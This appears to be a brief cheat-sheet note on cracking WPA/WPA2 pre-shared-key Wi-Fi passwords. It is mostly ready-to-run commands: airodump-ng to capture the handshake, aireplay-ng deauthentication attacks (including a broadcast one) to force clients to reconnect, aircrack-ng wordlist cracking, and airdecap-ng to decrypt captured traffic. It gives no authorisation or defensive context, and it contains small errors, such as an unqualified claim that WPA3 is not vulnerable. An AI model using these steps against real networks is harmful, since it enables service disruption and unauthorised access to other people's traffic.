Wifi protected access supports 2 methods of authentication: `PSK (pre-shared keys)` or `Enterprice (MGT)`. We'll crack PSK.
WPA, WPA2, WPA3 all rely on hashes (containing password from 8 to 63 chars) for keys.
WPA3 not yet vulnerable to attacks.

Methodology:

1) Capture <font style="color:#981f3a">4 Way Handshake</font>
		`# airodump-ng -c <channel> -w wpa --essid <name> --bssid <mac> wlan0mon`  (and keep it running while the you run the other commands below)
		`# aireplay-ng -0 1 -a <bssid> -c <client_bssid> wlan0mon` (without -c it will send a broadcast deauth)
2) Make a guess of the passphrase
		`# aircrack-ng -w <wordlist> -e <name> -b <bssid> wpa-01.cap`
3) Compare the output from the hash function to the handshake: if they match, the password guessed is correct.
		`# airdecap-ng -b <bssid> -e <name> -p <password> wpa-01.cap`  (to double check if you see decrypted packets)